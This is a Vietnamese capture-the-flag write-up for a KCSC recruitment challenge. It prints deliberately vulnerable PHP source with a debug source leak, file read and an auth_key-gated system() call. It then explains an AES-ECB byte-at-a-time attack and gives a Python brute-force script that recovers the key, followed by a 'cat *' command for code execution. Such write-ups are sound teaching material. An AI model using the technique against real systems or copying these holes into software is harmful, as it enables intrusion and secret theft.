# [CTF] EnCryptBoizzz - Recruiting KCSC members
## Description
 ``auth_key`` and ``key_for_enc`` are not published, try to leak them.
## Solution
mình có thể xem source code thông qua payload ``?debug=hint``

```
<?php

session_start();
@require_once 'config.php';

if (isset($_GET['debug'])) {
    show_source(__FILE__);
    die();
}

define('BLOCK_SIZE', 16);

function pad($string) {
    if (strlen($string) % BLOCK_SIZE === 0)
        $plaintext = $string;
    else  {
        $s = BLOCK_SIZE - strlen($string) % BLOCK_SIZE;
        $plaintext = $string.str_repeat(chr($s), $s);
    } 
    return $plaintext;
}
function encrypt($name) {
    global $auth_key, $key_for_enc; // from config.php with luv!!

    $method = 'AES-128-ECB';
    $plaintext = pad($name.$auth_key);
    return bin2hex(openssl_encrypt($plaintext, $method, $key_for_enc, OPENSSL_RAW_DATA));
}

if (isset($_GET["name"])) 
    $_SESSION["name"] = encrypt($_GET['name']);

if (isset($_GET['file'])) { // safe() in config.php, try to guess my filter =))
    if (safe($_GET['file'])) 
        @readfile($_GET['file']);
    else die("Dont hack me please =((((");
}

if (isset($_GET['auth_key'])) {
    if ($_GET['auth_key'] === $auth_key) {
        if ( isset($_GET["command"]) && strlen($_GET["command"]) <= 5)
            @system($_GET["command"]);
    }
    else echo "Wrong auth_key!!";
}

?>


<h1>Hello hacker ^>^ </h1>

<!-- 
// TODO: Remove 

<strong>To debug, use ?debug=hint </strong>
-->
```
Review qua source code:
- có tất cả 4 param: ``name`` , ``file``, ``auth_key``, ``command``. Cụ thể là:
- param ``name`` đuợc pass qua function ``Encrypt()`` và đuợc lưu như là phần tử trong biến toàn cục ``$_SESSION``, Ở đây ta có thể đọc đuợc giá trị lưu đó thông qua param ``file`` qua path ``/tmp/sess_PHPSESSID (Note: param ``file`` đã bị pass qua function ``safe()`` được lưu trong config.php vì vậy có vẻ ta khó có thể LFI thông qua đó)
- Nếu như ta lấy đưọc đúng ``auth_key`` thì sẽ đưọc rce thông qua param ``command``, vậy quan trọng làm thế nào để láy đuợc ``auth_key``??
- Quay lại với function ``Encrypt``, hàm này thực thi mã hóa AES-ECB ( 1 loại mã hóa phổ biến và có thể bypass đuợc) với `blocksize=16` (nếu không đủ thì sẽ tự động padding vào thông qua func ``pad()``). 

Giả sử input của ta là bội số của 16 bytes ( nếu không đủ thì tự thêm padding). Để tính đuợc offset thì ta sẽ phải increase offset đó + với 1 kí tự char bất kì có độ dài blocksize*2 đến khi nào ta thu đuợc string mà trong đó có 2 block giống nhau. Nếu đã có được offset, ta sẽ có thể triển khai tấn công bằng cách tạo 1 payload có độ dài 32bytes.

Payload: ``(a*i+key_to_brute+a*i) for i in range(15,-1,-1)``
Giải thích: Ta sẽ so sánh 2 block, block1: ``a*i+key+padding voi block2: a*i+secret+padding``, bruteforce đến khi thu đuợc 2 block trùng nhau, Cứ tiếp tục bằng cách giảm size xuống và tăng len key lên.

Script:
```
#!python3
import requests
import string
sess= requests.Session()
url ="http://localhost:2010/?"
HEADERS={
    "Cookie":"PHPSESSID=9ddcfdc4a8e8aad47382c083e4d66c2c"
}
#[11:43]: 64bytes-96bytes
#[43:107]: 128-xxx bytes

filter=string.ascii_letters+string.digits
key_add=''
def check():
    req=sess.get(url+"file=/tmp/sess_9ddcfdc4a8e8aad47382c083e4d66c2c",headers=HEADERS).text
    a=req.index('"')+1 
    if req[a:a+32]==req[a+32:a+64]: # so sanh block1 vs block 2
        return True
for i in range(15,-1,-1):
    for key in filter:
        payload='a'*i+key_add+key+'a'*i
        req2=sess.get(url+'name='+payload,headers=HEADERS)
        if check():
            key_add+=key
            print(key_add)
            break
```

![img](./img/Screenshot%20from%202022-03-03%2013-14-28.png)

``auth_key`` = ``AuthKey4n00b3r``

Vậy là xong, ta có thể đọc flag thông qua param ``command`` với payload ``cat%20*`` hoặc thích len < 5 thì ``m4%20*``